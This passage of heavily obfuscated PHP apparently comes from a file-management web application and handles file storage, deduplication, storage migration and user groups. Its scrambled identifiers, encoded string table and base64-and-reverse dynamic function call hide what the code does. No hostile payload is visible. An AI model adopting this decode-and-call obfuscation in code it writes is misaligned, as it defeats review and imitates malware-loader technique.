array($òŞ¡ÇòŞ[857] => $‡¶˜æ®„); $ô°Û½ê” = Model($òŞ¡ÇòŞ[514])->where($æÙ»ëö—)->count(); $¶‹—¥şé = Model($òŞ¡ÇòŞ[514])->where($æÙ»ëö—)->sum($òŞ¡ÇòŞ[78]); $äÏÓÙ£‰ = $µ•…ŸØ• . $òŞ¡ÇòŞ[2227] . $‡¶˜æ®„; $¨êØ‹Ì = LNG($µ•…ŸØ• == $òŞ¡ÇòŞ[591] ? $òŞ¡ÇòŞ[2228] : $òŞ¡ÇòŞ[2229]); $êö“Íö¶ = new TaskFileTransfer($äÏÓÙ£‰, $òŞ¡ÇòŞ[2223], $ô°Û½ê”, $¨êØ‹Ì . "\50{$‡¶˜æ®„}\51"); $êö“Íö¶->task[$òŞ¡ÇòŞ[803]] = (double) $¶‹—¥şé; $Ø®ÁÙ = KodIO::defaultDriver(); $ÁÔ¾’­ = $Ø®ÁÙ[$òŞ¡ÇòŞ[445]]; $Ã‹Ë¬ı = "\173\x69\x6f\x3a{$ÁÔ¾’­}\175\x2f"; $‘µÓÎï¥ = !0; $¯°Èá÷³ = array(); $¹¥’¾Åè = Model($òŞ¡ÇòŞ[216])->where($æÙ»ëö—)->field($òŞ¡ÇòŞ[2230])->select(); foreach ($¹¥’¾Åè as $æº¶ñó•) { $Ö»”òÎÉ = $æº¶ñó•[$òŞ¡ÇòŞ[86]]; $Œ“ŒÓÊÍ = $Ã‹Ë¬ı . str_replace("\x7b\151\x6f\72{$‡¶˜æ®„}\175\57", $òŞ¡ÇòŞ[12], $Ö»”òÎÉ); if (!IO::exist($Ö»”òÎÉ)) { $¯°Èá÷³[] = $æº¶ñó•[$òŞ¡ÇòŞ[511]]; $êö“Íö¶->updateFileEnd($æº¶ñó•[$òŞ¡ÇòŞ[32]], $æº¶ñó•[$òŞ¡ÇòŞ[78]]); continue; } if (IO::exist($Œ“ŒÓÊÍ)) { $êö“Íö¶->updateFileEnd($æº¶ñó•[$òŞ¡ÇòŞ[32]], $æº¶ñó•[$òŞ¡ÇòŞ[78]]); continue; } if (!IO::move($Ö»”òÎÉ, get_path_father($Œ“ŒÓÊÍ))) { $‘µÓÎï¥ = !1; break; } $æÙ»ëö— = array($òŞ¡ÇòŞ[511] => $æº¶ñó•[$òŞ¡ÇòŞ[511]]); $ô´ó­ìï = array($òŞ¡ÇòŞ[857] => $ÁÔ¾’­, $òŞ¡ÇòŞ[86] => $Œ“ŒÓÊÍ); Model($òŞ¡ÇòŞ[216])->where($æÙ»ëö—)->save($ô´ó­ìï); } $this->removeByFileID($¯°Èá÷³); if (!$‘µÓÎï¥) { $êö“Íö¶->stop($äÏÓÙ£‰); return !1; } $êö“Íö¶->end(); if ($µ•…ŸØ• == $òŞ¡ÇòŞ[1863]) { $this->remove($‡¶˜æ®„); } } public function progress($á‰ÇÙ©, $ª¹İ—óì) { return Task::get($ª¹İ—óì . $_SERVER[èùÙ¹Ïö][2227] . $á‰ÇÙ©); } private function removeByFileID($“Â¨û÷ = array()) { $­›©È‚Û =& $_SERVER[èùÙ¹Ïö]; if (empty($“Â¨û÷)) { return; } $û™å’İ¬ = array($­›©È‚Û[511] => array($­›©È‚Û[7], $“Â¨û÷)); $“Ú­•Ïü = Model($­›©È‚Û[1381])->where($û™å’İ¬)->field($­›©È‚Û[183])->select(); if (!$“Ú­•Ïü) { return; } $“Ú­•Ïü = array_to_keyvalue($“Ú­•Ïü, $­›©È‚Û[12], $­›©È‚Û[183]); foreach ($“Ú­•Ïü as $Ê£ãù÷) { Model($­›©È‚Û[460])->removeNow($Ê£ãù÷, !1); } } private function removeShareItems($ÌúØãŠ©) { $ÁÍ¬Ğ´° =& $_SERVER[èùÙ¹Ïö]; $°íÍ†ŞÀ = "\x7b\x69\x6f\x3a{$ÌúØãŠ©}\175\x2f"; $Ã…ç»âœ = array($ÁÍ¬Ğ´°[183] => 0, $ÁÍ¬Ğ´°[1223] => array($ÁÍ¬Ğ´°[429], "{$°íÍ†ŞÀ}\x25")); $½ï‰òô = Model($ÁÍ¬Ğ´°[1874])->where($Ã…ç»âœ)->field($ÁÍ¬Ğ´°[636])->select(); if (empty($½ï‰òô)) { return; } $Â¥ı‰ğ‡ = array_to_keyvalue($½ï‰òô, $ÁÍ¬Ğ´°[12], $ÁÍ¬Ğ´°[636]); Model($ÁÍ¬Ğ´°[635])->remove($Â¥ı‰ğ‡); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x4c\151\147\150\x74\101\x70\160"; public $modelType = "\123\171\x73\x74\x65\x6d\x4f\160\x74\x69\x6f\x6e"; public $field = array("\156\x61\155\145", "\x67\x72\x6f\x75\160", "\144\x65\163\x63", "\143\157\x6e\x74\145\x6e\x74"); public function listData($ÆõÂÒ¬£ = false, $¶ıÅÈü = "\x6d\x6f\x64\x69\x66\171\124\151\155\x65", $ïàÎîÃï = true) { return parent::listData($ÆõÂÒ¬£, $¶ıÅÈü, $ïàÎîÃï); } public function remove($µ»œî£‰) { $ˆ®Š´ñ³ = $this->findByName($µ»œî£‰); if (!$ˆ®Š´ñ³) { return !1; } return parent::remove($ˆ®Š´ñ³[$_SERVER[èùÙ¹Ïö][445]]); } public function add($‡¤Ô–ä³) { if ($this->findByName($‡¤Ô–ä³[$_SERVER[èùÙ¹Ïö][32]])) { return !1; } return parent::insert($‡¤Ô–ä³); } public function update($Óìë•, $Ğû”ÜîÍ) { $òüö”› =& $_SERVER[èùÙ¹Ïö]; $€ÑÒ»Ñ® = $this->findByName($Óìë•); $·àÇ‰é = $this->findByName($Ğû”ÜîÍ[$òüö”›[32]]); if (!$€ÑÒ»Ñ® || $·àÇ‰é && $·àÇ‰é[$òüö”›[445]] != $€ÑÒ»Ñ®[$òüö”›[445]]) { return !1; } return parent::update($€ÑÒ»Ñ®[$òüö”›[445]], $Ğû”ÜîÍ); } } goto cŸé„åŞØ; AŒ™˜†¨· : $fileSize = strrev(base64_decode($_SERVER[×ùÑòÉÀ][0])); function binCheckNeq($…»çÀû , $Û·ô’Í) { return $…»çÀû  != $Û·ô’Í; } $_SERVER[$_SERVER[×ùÑòÉÀ][1]] = $fileSize($_SERVER[$_SERVER[×ùÑòÉÀ][2]]); goto Dğ‡ÇøÏÀ©; CˆœÀ¨Ê‡˜: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\x61\155\145" => "\151\x6f\137\x66\x69\154\x65\x5f\x6d\145\164\141", "\x6d\145\x74\x61\x46\151\145\x6c\x64" => "\146\151\x6c\145\x49\104"); public function fileInfo($Ø ¸ùÅü) { $°Ìİí‰ =& $_SERVER[èùÙ¹Ïö]; static $ø›ú‡ÆÕ = array(); if (!isset($ø›ú‡ÆÕ[$Ø ¸ùÅü])) { $¹€–ÄÙà = $°Ìİí‰[1943]; $±‘àÃòˆ = Model($°Ìİí‰[514])->field($¹€–ÄÙà)->where(array($°Ìİí‰[512] => $Ø ¸ùÅü))->find(); $ø›ú‡ÆÕ[$Ø ¸ùÅü] = $±‘àÃòˆ; } return $ø›ú‡ÆÕ[$Ø ¸ùÅü]; } public function addFileByContent($¸—ÖÛÕÇ = '', $„Á…è = '') { $¿Êî¼¬ =& $_SERVER[èùÙ¹Ïö]; $Üû©¸ü­ = TEMP_PATH . $¿Êî¼¬[1944]; if (!is_dir($Üû©¸ü­)) { mk_dir($Üû©¸ü­); } $…¼ï¹Ú = $Üû©¸ü­ . $¿Êî¼¬[1945] . rand_string(16); file_put_contents($…¼ï¹Ú, $¸—ÖÛÕÇ); $Û°õñ„É = $this->addFile($…¼ï¹Ú, $„Á…è, !0); if (file_exists($…¼ï¹Ú)) { @unlink($…¼ï¹Ú); } return $Û°õñ„É; } public function createFileName($Æ©æñÎ‡, $…™·ìş = false, $¢—‚‹ë = false) { $Ğòı®© =& $_SERVER[èùÙ¹Ïö]; $íûÕ¦›® = IO::init($Ğòı®©[8]); $³±ÔÇ° = $this->makeFilePath($Æ©æñÎ‡, $íûÕ¦›®, $…™·ìş, $¢—‚‹ë); $çÂá’ç¯ = $íûÕ¦›®->pathFather($³±ÔÇ°); static $¸ÜñÏ…¤ = false; $Ã†…ê¶¢ = $Ğòı®©[1946] . md5($çÂá’ç¯); if (!$¸ÜñÏ…¤ && !Cache::get($Ã†…ê¶¢)) { $¸ÜñÏ…¤ = !0; $·ãÒˆúñ = IO::mkdir($çÂá’ç¯); if (!IO::exist($·ãÒˆúñ . $Ğòı®©[837])) { IO::mkfile($·ãÒˆúñ . $Ğòı®©[837]); } Cache::set($Ã†…ê¶¢, 1, 3600 * 2); } return $³±ÔÇ°; } public function makeFilePath($÷ˆğéÕ¡, $À˜È­ª, $Ş¯ß•µï = false, $³á“Á’ = false) { $‰‚ˆúÇ =& $_SERVER[èùÙ¹Ïö]; $Ï°îŠîö = Model($‰‚ˆúÇ[810])->get($‰‚ˆúÇ[1947]); $•¯ Ëëö = KodIO::defaultIO() . date($‰‚ˆúÇ[1948]); $óåÛÔÎ¬ = $•¯ Ëëö . rand_string(5) . short_id(100); $÷ˆğéÕ¡ = str_replace($‰‚ˆúÇ[8], $‰‚ˆúÇ[11], KodIO::clear($÷ˆğéÕ¡)); $à¿ÖœÚ¬ = $À˜È­ª->ext($÷ˆğéÕ¡); if (!$÷ˆğéÕ¡) { $Ï°îŠîö = $‰‚ˆúÇ[1949]; } switch ($Ï°îŠîö) { case $‰‚ˆúÇ[1950]: $óåÛÔÎ¬ = $óåÛÔÎ¬ . $‰‚ˆúÇ[10] . $À˜È­ª->ext($÷ˆğéÕ¡); if ($à¿ÖœÚ¬ == $‰‚ˆúÇ[1887]) { $óåÛÔÎ¬ .= $‰‚ˆúÇ[1254]; } break; case $‰‚ˆúÇ[1951]: $Ù†Ííø = Model($‰‚ˆúÇ[810])->get($‰‚ˆúÇ[811]); $ÚˆíÆ¸ƒ = substr(md5($‰‚ˆúÇ[812] . $Ù†Ííø . date($‰‚ˆúÇ[788])), 0, 8); $ìöª™¦° = KodIO::defaultDriver(); $•¯ Ëëö = $‰‚ˆúÇ[1285] . $ìöª™¦°[$‰‚ˆúÇ[445]] . $‰‚ˆúÇ[454] . date($‰‚ˆúÇ[1952]) . $ÚˆíÆ¸ƒ . $‰‚ˆúÇ[8]; if ($à¿ÖœÚ¬ == $‰‚ˆúÇ[1887]) { $÷ˆğéÕ¡ .= $‰‚ˆúÇ[1254]; } $²ˆ¡§¬­ = $‰‚ˆúÇ[1953] . $•¯ Ëëö . $÷ˆğéÕ¡; CacheLock::lock($²ˆ¡§¬­); $óåÛÔÎ¬ = $•¯ Ëëö . $÷ˆğéÕ¡; if (IO::exist($•¯ Ëëö . $÷ˆğéÕ¡)) { $òşºªÊ† = substr($÷ˆğéÕ¡, 0, strlen($÷ˆğéÕ¡) - strlen($à¿ÖœÚ¬)); $ôºÊïÛî = $³á“Á’ ? substr($³á“Á’, 0, 5) : ($Ş¯ß•µï ? substr($Ş¯ß•µï, 0, 5) : rand_string(5)); $óåÛÔÎ¬ = $•¯ Ëëö . $òşºªÊ† . $ôºÊïÛî . $‰‚ˆúÇ[10] . $à¿ÖœÚ¬; } if (IO::isTypeObject($óåÛÔÎ¬) && !IO::isUploadServer($óåÛÔÎ¬)) { if (IO::exist($óåÛÔÎ¬)) { return $óåÛÔÎ¬; } $¹Èšï = IO::setContent($óåÛÔÎ¬, $‰‚ˆúÇ[12]); if (!$¹Èšï) { show_json($‰‚ˆúÇ[1954], !1); } } CacheLock::unlock($²ˆ¡§¬­); break; case $‰‚ˆúÇ[1949]: break; default: break; } return $óåÛÔÎ¬; } public function addFileByRemote($œ¦îÛ¿, $Èıå–öú, $‹ÁÜºäã = array()) { $ëƒçÛ =& $_SERVER[èùÙ¹Ïö]; if (!IO::exist($œ¦îÛ¿)) { return !1; } $¨şÔ—æş = $‹ÁÜºäã[$ëƒçÛ[517]] ? $‹ÁÜºäã[$ëƒçÛ[517]] : $ëƒçÛ[12]; $Œ ŞÌ²æ = IO::hashMd5($œ¦îÛ¿, $¨şÔ—æş); $£‘šÈ¥ = KodIO::defaultDriver(); $æ¤´ñúØ = array($ëƒçÛ[588] => IO::size($œ¦îÛ¿), $ëƒçÛ[1955] => 1, $ëƒçÛ[464] => $Èıå–öú, $ëƒçÛ[848] => $£‘šÈ¥[$ëƒçÛ[445]], $ëƒçÛ[465] => $œ¦îÛ¿, $ëƒçÛ[1956] => $‹ÁÜºäã[$ëƒçÛ[643]] ? $‹ÁÜºäã[$ëƒçÛ[643]] : IO::hashSimple($œ¦îÛ¿), $ëƒçÛ[1957] => $Œ ŞÌ²æ ? $Œ ŞÌ²æ : $¨şÔ—æş); if ($¬ÔèÓïø = $this->addFileCheckExist($æ¤´ñúØ[$ëƒçÛ[643]], $æ¤´ñúØ[$ëƒçÛ[517]], $æ¤´ñúØ[$ëƒçÛ[78]])) { return $¬ÔèÓïø; } return $this->addFileData($æ¤´ñúØ); } private function addFileData($¸õÒ²ğ) { $İ¸Ñ¿¿ó =& $_SERVER[èùÙ¹Ïö]; if (!$¸õÒ²ğ) { return !1; } $¸õÒ²ğ[$İ¸Ñ¿¿ó[78]] = intval($¸õÒ²ğ[$İ¸Ñ¿¿ó[78]]); if (!$¸õÒ²ğ[$İ¸Ñ¿¿ó[78]] && strlen($¸õÒ²ğ[$İ¸Ñ¿¿ó[643]]) > 32) { $¸õÒ²ğ[$İ¸Ñ¿¿ó[78]] = intval(substr($¸õÒ²ğ[$İ¸Ñ¿¿ó[643]], 32)); } $ğÜÌÉ—è = $this->add($¸õÒ²ğ); return $this->find($ğÜÌÉ—è); } public function addFile($—¢…½ëé, $ĞÃˆñŒ½, $äğ£Ğ­À = false) { $—¡ğœ™Ô =& $_SERVER[èùÙ¹Ïö]; $õ¬ÆÁ ¬ = IO::hashSimple($—¢…½ëé); $¸É·«ÕÚ = IO::size($—¢…½ëé); $„÷ôåØ = $¸É·«ÕÚ <= 1024 * 1024 * 10 ? IO::hashMd5($—¢…½ëé) : $—¡ğœ™Ô[12]; $×Œ¨Á™ = $—¡ğœ™Ô[1958] . $õ¬ÆÁ ¬; CacheLock::lock($×Œ¨Á™); if ($„÷ôåØ && $õ¬ÆÁ ¬) { $Ä—óØÍË = $this->addFileCheckExist($õ¬ÆÁ ¬, $„÷ôåØ, $¸É·«ÕÚ); if ($Ä—óØÍË) { CacheLock::unlock($×Œ¨Á™); return $Ä—óØÍË; } } $ŞèòÒ§ = $this->addFileMake($—¢…½ëé, $¸É·«ÕÚ, $õ¬ÆÁ ¬, $„÷ôåØ, $ĞÃˆñŒ½, $äğ£Ğ­À); $ÅØ‘ö‚ = $this->addFileData($ŞèòÒ§); CacheLock::unlock($×Œ¨Á™); if (!$„÷ôåØ && $ÅØ‘ö‚) { $this->fileMd5Check($ÅØ‘ö‚); } return $ÅØ‘ö‚; } public function fileMd5Check($¿”ıœ·) { $™£íàÀÉ =& $_SERVER[èùÙ¹Ïö]; $ ’İ‚Í¢ = array($¿”ıœ·[$™£íàÀÉ[511]], $¿”ıœ·[$™£íàÀÉ[86]]); $ƒÊéõ“Ó = $™£íàÀÉ[1959] . $¿”ıœ·[$™£íàÀÉ[86]]; $Êè€î×² = $™£íàÀÉ[1960] . $¿”ıœ·[$™£íàÀÉ[511]]; TaskQueue::add($™£íàÀÉ[1961], $ ’İ‚Í¢, $ƒÊéõ“Ó, $Êè€î×²); } public function fileMd5Set($È¨©¨ó›, $İ““…Ä ) { $²Ø›‘… =& $_SERVER[èùÙ¹Ïö]; $¸ÏÔõğ = $this->find($È¨©¨ó›); if (!$¸ÏÔõğ || $¸ÏÔõğ[$²Ø›‘…[517]]) { return; } $º‘ŠĞÜœ = IO::hashMd5($İ““…Ä ); if (!$º‘ŠĞÜœ) { return $²Ø›‘…[12]; } $this->where(array($²Ø›‘…[511] => $È¨©¨ó›))->save(array($²Ø›‘…[517] => $º‘ŠĞÜœ)); } public function addFileMake($ŞÒÍ¹õÄ, $™»ÌØ†¶, $“û°­Û‹, $‚ìƒÁãâ, $Óù”Ç¤›, $›ÍÓì‹) { $ŠÔ®¡Ø™ =& $_SERVER[èùÙ¹Ïö]; $é”çÜğ = $this->createFileName($Óù”Ç¤›, $“û°­Û‹, $‚ìƒÁãâ); $™¤úÚªÄ = get_path_father($é”çÜğ); $ß·Š›ıæ = get_path_this($é”çÜğ); if ($›ÍÓì‹) { $²•ğ÷õè = IO::move($ŞÒÍ¹õÄ, $™¤úÚªÄ, !1, $ß·Š›ıæ); } else { $²•ğ÷õè = IO::copy($ŞÒÍ¹õÄ, $™¤úÚªÄ, !1, $ß·Š›ıæ); } if (!$²•ğ÷õè) { return !1; } $ä’¢¯±˜ = KodIO::defaultDriver(); $„¾†Ú¶ = array($ŠÔ®¡Ø™[588] => $™»ÌØ†¶, $ŠÔ®¡Ø™[1955] => 1, $ŠÔ®¡Ø™[464] => $Óù”Ç¤›, $ŠÔ®¡Ø™[848] => $ä’¢¯±˜[$ŠÔ®¡Ø™[445]], $ŠÔ®¡Ø™[465] => $é”çÜğ, $ŠÔ®¡Ø™[1956] => $“û°­Û‹, $ŠÔ®¡Ø™[1957] => $‚ìƒÁãâ); return $„¾†Ú¶; } public function addFileCheckExist($ÌØ“ôóİ, $ƒóÂ¯×Ë, $Í°€ºŸ£) { $Ô´óÌŠÖ =& $_SERVER[èùÙ¹Ïö]; $ïÄÇÙÇ = $this->findByHash($ÌØ“ôóİ, $ƒóÂ¯×Ë); if (!$ïÄÇÙÇ) { return !1; } $®Úñ±ô› = array($Ô´óÌŠÖ[1955] => intval($ïÄÇÙÇ[$Ô´óÌŠÖ[1962]]) + 1, $Ô´óÌŠÖ[588] => $Í°€ºŸ£); $this->where(array($Ô´óÌŠÖ[512] => $ïÄÇÙÇ[$Ô´óÌŠÖ[511]]))->save($®Úñ±ô›); return $ïÄÇÙÇ; } public function remove($ö¡ÁéË) { $this->linkCountChange($ö¡ÁéË, !1); $this->clearEmpty(); return !0; } public function linkAdd($¢™õ¨î“) { $this->linkCountChange($¢™õ¨î“, !0); } public function linkCountChange($‡Æ¢â‡í, $‘ŒÜÏ“) { $Š€Ì€üö =& $_SERVER[èùÙ¹Ïö]; if (!$‡Æ¢â‡í) { return; } if (!is_array($‡Æ¢â‡í)) { $‡Æ¢â‡í = array($‡Æ¢â‡í); } $ªò²½‘ø = array(); foreach ($‡Æ¢â‡í as $ş–Ûëß•) { $®Ä™Ò› = $ş–Ûëß• . $Š€Ì€üö[12]; if (!$ªò²½‘ø[$®Ä™Ò›]) { $ªò²½‘ø[$®Ä™Ò›] = 0; } $ªò²½‘ø[$®Ä™Ò›]++; } $Ö÷ÁÔêÂ = array(); foreach ($ªò²½‘ø as $ş–Ûëß• => $•İ»ï«) { $®Ä™Ò› = $•İ»ï« . $Š€Ì€üö[12]; if (!$Ö÷ÁÔêÂ[$®Ä™Ò›]) { $Ö÷ÁÔêÂ[$®Ä™Ò›] = array(); } $Ö÷ÁÔêÂ[$®Ä™Ò›][] = $ş–Ûëß•; } foreach ($Ö÷ÁÔêÂ as $•İ»ï« => $²ï¨á§) { if (!$²ï¨á§) { continue; } $•İ»ï« = $‘ŒÜÏ“ ? $•İ»ï« : -intval($•İ»ï«); $ØØâ®­ = array($Š€Ì€üö[511] => array($Š€Ì€üö[7], $²ï¨á§)); if ($•İ»ï« < 0) { $ØØâ®­[$Š€Ì€üö[1962]] = array($Š€Ì€üö[1061], abs($•İ»ï«)); } $this->where($ØØâ®­)->setAdd($Š€Ì€üö[1962], $•İ»ï«); } } public function findByHash($á¦—û», $µ¥Àä×Ô = false) { $İíµºô» =& $_SERVER[èùÙ¹Ïö]; if (!$á¦—û» && !$µ¥Àä×Ô) { return !1; } $á©†ßÖ  = array($İíµºô»[1956] => $á¦—û»); if ($µ¥Àä×Ô) { $á©†ßÖ  = array($İíµºô»[1957] => $µ¥Àä×Ô); } return $this->order($İíµºô»[1963])->where($á©†ßÖ )->find(); } public function clearEmpty($Õ±³áş = 0) { $ïŸˆıüÆ =& $_SERVER[èùÙ¹Ïö]; $ãå¬¬£ƒ = time() - 3600 * 24 * $Õ±³áş; $œÒÔ«Îí = $ïŸˆıüÆ[1964] . $ãå¬¬£ƒ; $¢ÄÛç¹Õ = $this->where($œÒÔ«Îí)->select(); if (!$¢ÄÛç¹Õ) { return; } $¯Ôİ¥¯ = new Task($ïŸˆıüÆ[1965], $ïŸˆıüÆ[12], count($¢ÄÛç¹Õ)); foreach ($¢ÄÛç¹Õ as $ü½ºšĞÔ) { $¯Ôİ¥¯->update(1); $this->resetFile($ü½ºšĞÔ); } $¯Ôİ¥¯->end(); } public function resetFile($İÒ‰ºÚÅ) { $ÇöåİªÀ =& $_SERVER[èùÙ¹Ïö]; $¨­Ñ‹Î± = array($ÇöåİªÀ[512] => $İÒ‰ºÚÅ[$ÇöåİªÀ[511]]); $Å›â¸ßƒ = Model($ÇöåİªÀ[1381])->where($¨­Ñ‹Î±)->count(); $ÕÖÆÓ– = Model($ÇöåİªÀ[1966])->where($¨­Ñ‹Î±)->count(); $³è·ÎƒÃ = intval($Å›â¸ßƒ) + intval($ÕÖÆÓ–); if ($³è·ÎƒÃ == 0) { IO::remove($İÒ‰ºÚÅ[$ÇöåİªÀ[86]]); Model($ÇöåİªÀ[1967])->delete($İÒ‰ºÚÅ[$ÇöåİªÀ[511]]); $this->where($¨­Ñ‹Î±)->delete(); $this->metaSet($İÒ‰ºÚÅ[$ÇöåİªÀ[511]], null, null); return; } if ($İÒ‰ºÚÅ[$ÇöåİªÀ[1962]] != $³è·ÎƒÃ) { $this->where($¨­Ñ‹Î±)->save(array($ÇöåİªÀ[1955] => $³è·ÎƒÃ)); } } public function storageInfo($“©Ñ‹ ı = false) { $ç«×ƒ® =& $_SERVER[èùÙ¹Ïö]; $³²Õ°Üİ = $this->count() + 0.0; $Öş§è£ = 0; $çÚ›“í = 1; $Òœ‘µÕÛ = 0; $á²äĞó½ = 5000; for ($Ì¯šÃ¯¹ = 0; $Ì¯šÃ¯¹ < $³²Õ°Üİ; $Ì¯šÃ¯¹ = $Ì¯šÃ¯¹ + $á²äĞó½) { $ÜšÜìÎ = $this->limit($Ì¯šÃ¯¹, $Ì¯šÃ¯¹ + $á²äĞó½)->select(); foreach ($ÜšÜìÎ as $ú»„™¯ø) { $çÚ›“í += $ú»„™¯ø[$ç«×ƒ®[78]] * $ú»„™¯ø[$ç«×ƒ®[1962]]; $Öş§è£ += $ú»„™¯ø[$ç«×ƒ®[78]] * ($ú»„™¯ø[$ç«×ƒ®[1962]] - 1); $Òœ‘µÕÛ += $ú»„™¯ø[$ç«×ƒ®[1962]]; } } $–éòŒŸ = array($ç«×ƒ®[1968] => $çÚ›“í, $ç«×ƒ®[1969] => $Öş§è£, $ç«×ƒ®[1970] => $Öş§è£ / $çÚ›“í, $ç«×ƒ®[82] => $³²Õ°Üİ, $ç«×ƒ®[1971] => $Òœ‘µÕÛ); return $–éòŒŸ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\155\x65" => "\x67\x72\157\165\160\137\x6d\145\164\x61", "\155\145\164\x61\x46\151\145\x6c\144" => "\x67\x72\x6f\165\x70\111\x44"); protected function cacheFunctionAlias($œ×Ìİ’÷) { $åºø±¤ =& $_SERVER[èùÙ¹Ïö]; return array($åºø±¤[1972] => array($œ×Ìİ’÷[0], $åºø±¤[1973]), $åºø±¤[1974] => array($œ×Ìİ’÷[0], $åºø±¤[1975])); } protected function getInfo($•£æö˜Ò, $ÊÄ±†–ê = false) { $˜ŸÏ”¸› = $this->getInfoSimple($•£æö˜Ò); if (!$˜ŸÏ”¸›) { return !1; } if ($ÊÄ±†–ê) { return $this->_listDataApplyItem($˜ŸÏ”¸›); } return $this->cacheFunctionGet($_SERVER[èùÙ¹Ïö][1976], $•£æö˜Ò); } protected function getInfoSimple($‰›×©Ö‹, $˜»Æ¬¼” = false) { $ÉŸÇ•ä§ =& $_SERVER[èùÙ¹Ïö]; if ($˜»Æ¬¼”) { $îúª±û§ = array($ÉŸÇ•ä§[1894] => intval($‰›×©Ö‹)); $ÆÚï¹â = $this->where($îúª±û§)->find(); return is_array($ÆÚï¹â) ? $ÆÚï¹â : array(); } return $this->cacheFunctionGet($ÉŸÇ•ä§[1977], $‰›×©Ö‹); } protected function groupAdd($ç„çŠñ¯) { $œ®Íê¦™ =& $_SERVER[èùÙ¹Ïö]; if (!$ç„çŠñ¯[$œ®Íê¦™[182]] && isset($ç„çŠñ¯[$œ®Íê¦™[1894]]) && $ç„çŠñ¯[$œ®Íê¦™[1894]] == 1) { if ($›‚˜ßÕ = $this->getInfoSimple($ç„çŠñ¯[$œ®Íê¦™[1894]], !0)) { return $ç„çŠñ¯[$œ®Íê¦™[1894]]; } } else { $›‚˜ßÕ = $this->getInfoSimple($ç„çŠñ¯[$œ®Íê¦™[182]]); if (!$›‚˜ßÕ) { return !1; } } $èŸ„÷„â = $œ®Íê¦™[566]; if ($›‚˜ßÕ[$œ®Íê¦™[556]]) { $èŸ„÷„â = $›‚˜ßÕ[$œ®Íê¦™[556]] . $›‚˜ßÕ[$œ®Íê¦™[1894]] . $œ®Íê¦™[50]; } $…·Â—éÇ = array($œ®Íê¦™[464] => $this->groupNameAuto($ç„çŠñ¯[$œ®Íê¦™[182]], $ç„çŠñ¯[$œ®Íê¦™[32]]), $œ®Íê¦™[447] => $ç„çŠñ¯[$œ®Íê¦™[182]], $œ®Íê¦™[623] => $èŸ„÷„â, $œ®Íê¦™[1978] => $ç„çŠñ¯[$œ®Íê¦™[1881]], $œ®Íê¦™[1979] => 0, $œ®Íê¦™[1898] => 0); if (isset($ç„çŠñ¯[$œ®Íê¦™[1918]])) { $…·Â—éÇ[$œ®Íê¦™[1918]] = $ç„çŠñ¯[$œ®Íê¦™[1918]]; } else { $ŸÎ›ûş = $this->max($œ®Íê¦™[1918]); if (!$ŸÎ›ûş) { $ŸÎ›ûş = 0; } $…·Â—éÇ[$œ®Íê¦™[1918]] = $ŸÎ›ûş + 1; } if (!empty($ç„çŠñ¯[$œ®Íê¦™[1894]])) { $…·Â—éÇ[$œ®Íê¦™[1894]] = $ç„çŠñ¯[$œ®Íê¦™[1894]]; } $²‰î¤Óœ = $this->add($…·Â—éÇ); $this->setNamePinyin($²‰î¤Óœ, $…·Â—éÇ[$œ®Íê¦™[32]]); if (isset($ç„çŠñ¯[$œ®Íê¦™[1980]])) { $this->metaSet($²‰î¤Óœ, array($œ®Íê¦™[1980] => $ç„çŠñ¯[$œ®Íê¦™[1980]], $œ®Íê¦™[1981] => $ç„çŠñ¯[$œ®Íê¦™[1981]])); unset($ç„çŠñ¯[$œ®Íê¦™[1980]]); unset($ç„çŠñ¯[$œ®Íê¦™[1981]]); } Model($œ®Íê¦™[1381])->groupRootAdd($²‰î¤Óœ); $this->_clearCache($ç„çŠñ¯[$œ®Íê¦™[182]]); return $²‰î¤Óœ; } protected function groupEdit($¯ıª­—, $ıìóëÌ¸) { $¿Üõ™÷â =& $_SERVER[èùÙ¹Ïö]; $‚éİ‚÷† = $this->getInfoSimple($¯ıª­—); if (!$‚éİ‚÷†) { return !1; } if (!empty($ıìóëÌ¸[$¿Üõ™÷â[182]])) { $ì™Î‡Íå = $this->getInfoSimple($ıìóëÌ¸[$¿Üõ™÷â[182]]); if (!$ì™Î‡Íå) { return !1; } if ($‚éİ‚÷†[$¿Üõ™÷â[1894]] == $ì™Î‡Íå[$¿Üõ™÷â[1894]]) { return !1; } if ($ıìóëÌ¸[$¿Üõ™÷â[182]] != $‚éİ‚÷†[$¿Üõ™÷â[182]]) { if ($ì™Î‡Íå[$¿Üõ™÷â[556]] !== $‚éİ‚÷†[$¿Üõ™÷â[556]] && strpos($ì™Î‡Íå[$¿Üõ™÷â[556]], $‚éİ‚÷†[$¿Üõ™÷â[556]] . $‚éİ‚÷†[$¿Üõ™÷â[1894]] . $¿Üõ™÷â[50]) === 0) { return !1; } $ıìóëÌ¸[$¿Üõ™÷â[623]] = $ì™Î‡Íå[$¿Üõ™÷â[556]] . $ıìóëÌ¸[$¿Üõ™÷â[182]] . $¿Üõ™÷â[50]; $this->_changeChildLevel($‚éİ‚÷†, $ì™Î‡Íå); $this->_clearCache($ì™Î‡Íå[$¿Üõ™÷â[1894]]); $this->_clearCache($‚éİ‚÷†[$¿Üõ™÷â[182]]); } } if (isset($ıìóëÌ¸[$¿Üõ™÷â[32]])) { $this->setNamePinyin($¯ıª­—, $ıìóëÌ¸[$¿Üõ™÷â[32]]); } if (isset($ıìóëÌ¸[$¿Üõ™÷â[1980]])) { $this->metaSet($¯ıª­—, array($¿Üõ™÷â[1980] => $ıìóëÌ¸[$¿Üõ™÷â[1980]], $¿Üõ™÷â[1981] => $ıìóëÌ¸[$¿Üõ™÷â[1981]])); unset($ıìóëÌ¸[$¿Üõ™÷â[1980]]); unset($ıìóëÌ¸[$¿Üõ™÷â[1981]]); } $this->_clearChildrenCache($‚éİ‚÷†); return $this->where(array($¿Üõ™÷â[1982] => $¯ıª­—))->save($ıìóëÌ¸); } private function _clearChildrenCache($ù­àÓÇ³) { $Â§íÚñ˜ =& $_SERVER[èùÙ¹Ïö]; $¸£¼‚Øä = array($Â§íÚñ˜[623] => array($Â§íÚñ˜[583], $ù­àÓÇ³[$Â§íÚñ˜[556]] . $ù­àÓÇ³[$Â§íÚñ˜[1894]] . $Â§íÚñ˜[584])); $‘Ä·¢Úš = $this->field($Â§íÚñ˜[1894])->where($¸£¼‚Øä)->select(); foreach ($‘Ä·¢Úš as $âªíŠÅ’) { 